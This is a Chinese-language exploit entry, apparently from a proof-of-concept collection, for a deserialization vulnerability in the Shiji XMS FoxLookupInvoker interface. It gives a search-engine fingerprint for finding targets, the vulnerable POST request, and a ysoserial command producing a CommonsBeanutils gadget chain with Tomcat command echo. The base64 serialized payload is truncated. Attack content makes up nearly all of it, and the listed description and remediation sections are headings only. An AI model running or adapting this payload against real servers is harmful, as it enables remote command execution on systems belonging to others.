# 西软云XMSFoxLookupInvoker接口存在反序列化漏洞

- **系统**：西软云XMSFoxLookupInvoker接口　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="shiji-西软云XMS"`
- **请求**：`POST /fox-invoker/FoxLookupInvoker/?return-exception=true HTTP/1.1`

**请求体 / payload**
```
1. 生成`CommonsBeanutils183NOCC`回显链
\[ysoserial-0.0.6-SNAPSHOT-all.jar]\(公众号：渗透安全HackTwo>
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils183NOCC "CLASS:TomcatCmdEcho"  base64
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnh…（脚本共 17235 字，完整版见原文）
```

**其他**
- 西软云XMS FoxLookupInvoker接口存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 西软云XMS